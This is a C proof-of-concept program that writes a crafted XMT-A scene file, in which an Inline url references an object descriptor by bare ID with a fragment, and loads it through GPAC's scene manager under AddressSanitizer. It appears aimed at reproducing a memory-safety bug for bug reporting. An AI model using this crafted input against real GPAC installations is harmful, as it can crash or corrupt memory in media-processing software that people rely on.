/*
 * GPAC XMT-A scene loader PoC - exercises the od-URL rewriting done at the end
 * of an XMT-A parse (xmt_resolve_od_links) through the public scene manager
 * loader API, the same path MP4Box uses for "MP4Box -mp4 scene.xmt".
 *
 * The scene declares an ObjectDescriptor carrying the numeric ID 1 and an
 * Inline node whose url references that OD by its bare binary ID together
 * with a segment fragment.
 *
 * build (from the gpac root after configure && make):
 *   cc -fsanitize=address -DGPAC_HAVE_CONFIG_H -DGPAC_DISABLE_UNSAFE_STRFUNC \
 *      -I. -Iinclude pocs/newbug.c -o /tmp/newbug -Lbin/gcc -lgpac
 * run:   LD_LIBRARY_PATH=bin/gcc /tmp/newbug /tmp/poc_scene.xmt
 */

#include <stdio.h>
#include <string.h>

#include <gpac/tools.h>
#include <gpac/scene_manager.h>

static const char *xmt_scene =
"<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n"
"<XMT-A xmlns=\"urn:mpeg:mpeg4:xmta:schema:2002\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:schemaLocation=\"urn:mpeg:mpeg4:xmta:schema:2002 xmt-a.xsd\">\n"
" <Header>\n"
"  <ObjectDescriptor objectDescriptorID=\"1\"/>\n"
" </Header>\n"
" <Body>\n"
"  <par>\n"
"   <Replace>\n"
"    <Scene>\n"
"     <OrderedGroup>\n"
"      <children>\n"
"       <Inline url=\"1#x\"/>\n"
"      </children>\n"
"     </OrderedGroup>\n"
"    </Scene>\n"
"   </Replace>\n"
"  </par>\n"
" </Body>\n"
"</XMT-A>\n";

int main(int argc, char **argv)
{
	const char *fname = (argc > 1) ? argv[1] : "poc_scene.xmt";
	FILE *f;
	GF_SceneGraph *sg;
	GF_SceneManager *ctx;
	GF_SceneLoader load;
	GF_Err e;

	f = fopen(fname, "wb");
	if (!f) {
		fprintf(stderr, "cannot open %s\n", fname);
		return 2;
	}
	fwrite(xmt_scene, 1, strlen(xmt_scene), f);
	fclose(f);

	gf_sys_init(GF_FALSE, "0");

	sg = gf_sg_new();
	ctx = gf_sm_new(sg);
	memset(&load, 0, sizeof(GF_SceneLoader));
	load.fileName = (char *) fname;
	load.ctx = ctx;
	load.flags = GF_SM_LOAD_MPEG4_STRICT;

	e = gf_sm_load_init(&load);
	if (e >= 0) {
		e = gf_sm_load_run(&load);
	}
	gf_sm_load_done(&load);

	printf("load result: %s\n", gf_error_to_string(e));

	gf_sm_del(ctx);
	gf_sg_del(sg);
	gf_sys_close();
	return (e < 0) ? 1 : 0;
}
